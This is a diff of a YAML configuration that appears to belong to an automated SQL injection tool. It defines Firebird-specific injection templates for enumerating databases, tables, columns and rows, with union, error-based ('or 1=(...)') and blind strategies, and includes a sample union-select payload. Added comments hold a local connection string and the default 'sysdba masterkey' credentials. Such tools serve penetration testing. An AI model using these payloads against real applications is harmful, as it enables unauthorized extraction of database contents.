@@ -1,8 +1,11 @@
 vendor: Firebird
+# Service Firebird Server - DefaultInstance
+# jdbc:firebirdsql://127.0.0.1:3050/E:/Dev/Firebird/Firebird-2.5.9.27139-0_x64/examples/empbuild/EMPLOYEE.FDB
+# sysdba masterkey
 
 resource:
  info: |
-  SELECT
+  select
       rdb$get_context('SYSTEM', 'ENGINE_VERSION')
       || '${enclose_value_sql}'
       || rdb$get_context('SYSTEM', 'DB_NAME')
@@ -15,7 +18,7 @@ resource:
   database: |
    /**
     * aggreg function return exec fault
-    * SELECT item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations ROWS 2 TO 2)-- 0x0000000100000000
+    * select item_type FROM SALES where 1=0 union select list(rdb$relation_name,'a')from(select rdb$relation_name from rdb$relations rows 2 to 2)-- 0x0000000100000000
     * => use limit 1,1 instead
     */
    select
@@ -26,7 +29,7 @@ resource:
    ${limit}
 
   table: |
-   SELECT
+   select
        '${enclose_value_sql}'
        || trim(rdb$relation_name)
        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
@@ -34,7 +37,7 @@ resource:
    ${limit}
 
   column: |
-   SELECT
+   select
        '${enclose_value_sql}'
        || trim(rdb$field_name)
        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
@@ -44,7 +47,7 @@ resource:
 
   row:
    query: |
-    SELECT
+    select
         '${enclose_value_sql}'
         || ${fields}
         || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
@@ -62,7 +65,7 @@ strategy:
         * If reach end of string (${lead}i) then NULLIF nullifies the result
         */
        '${lead}'
-       || NULLIF(
+       || nullif(
            substring(
                (${injection})
                from ${window.char}
@@ -71,7 +74,7 @@ strategy:
            '${trail_sql}'
        )
        from RDB$DATABASE
-  limit: ROWS ${limit.value} TO ${limit.value}
+  limit: rows ${limit.value} to ${limit.value}
   failsafe: (1337${indice}7330%2b1)
   # calibrator fine at 1024, except for Error strategy
   calibrator: |
@@ -87,6 +90,8 @@ strategy:
     - 'Warning: ibase_query()'
     - function.ibase-query
     - Unexpected end of command - line
+   orderByErrorMessage:
+    - Invalid column position used in the ORDER BY clause
 
  normal:
   indices: union select ${indices} from RDB$DATABASE
@@ -96,18 +101,17 @@ strategy:
  error:
   method:
   
-   - name: CONVERT:OR
+   - name: Cast:or
      query: |
-      OR 1=(
+      /* GDS Exception. 335544334. conversion error from string "<sqli>" */
+      or 1=(
           ${window}
       )
-     # TODO Add to SQLEngine
      capacity: 52
   
-   - name: CONVERT:AND
+   - name: Cast:and
      query: |
-      AND 1=(
+      and 1=(
           ${window}
       )
-     # TODO Add to SQLEngine
      capacity: 52
